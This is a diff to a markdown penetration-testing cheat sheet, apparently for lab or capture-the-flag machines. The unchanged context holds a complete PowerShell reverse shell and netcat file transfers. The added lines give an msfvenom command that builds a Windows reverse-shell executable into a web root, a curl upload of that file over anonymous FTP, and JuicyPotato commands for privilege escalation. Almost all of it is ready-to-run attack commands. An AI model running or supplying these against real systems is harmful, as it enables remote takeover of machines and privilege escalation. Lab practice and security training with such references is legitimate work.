@@ -310,6 +310,11 @@ ssh -oHostKeyAlgorithms=ssh-rsa -oKexAlgorithms=+diffie-hellman-group1-sha1,diff
 
 # Windows PowerShell reverse shell
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client=New-Object System.Net.Sockets.TCPClient('$LocalIP',$Lport);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendbyte=([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+# Generate a 32-bit stageless Windows shell executable for a 32-bit target
+msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp \
+  LHOST=$LocalIP LPORT=$Lport EXITFUNC=thread \
+  -b '\x00\x0a\x0d' -f exe -o $BoxDir/www/$File
 ```
 
 ## 7. FILE TRANSFERS
@@ -354,6 +359,11 @@ nc -lvnp $Lport < $File
 nc -nv $BoxIP $Lport > $File
 base64 -w0 $File
 echo "$Encoded" | base64 -d > $File
+```
+
+```bash
+# Upload a file through anonymous FTP to a web root
+curl --upload-file $BoxDir/www/$File ftp://$BoxIP/$RemoteFile
 ```
 
 ## 8. POST-EXPLOITATION: LINUX
@@ -506,6 +516,10 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 
 # Run a process with alternate credentials when WinRM or RDP is unavailable
 .\RunasCs.exe $Username2 $Password2 "cmd /c whoami"
+
+# Test and launch JuicyPotato from a token with SeImpersonatePrivilege
+$PotatoPath -z -l $PotatoPort -c $CLSID
+$PotatoPath -t * -p $PayloadPath -l $PotatoPort -c $CLSID
 ```
 
 <!-- TODO --> <!-- Add concise token, DLL hijack, registry, AlwaysInstallElevated, and named-pipe branches. -->
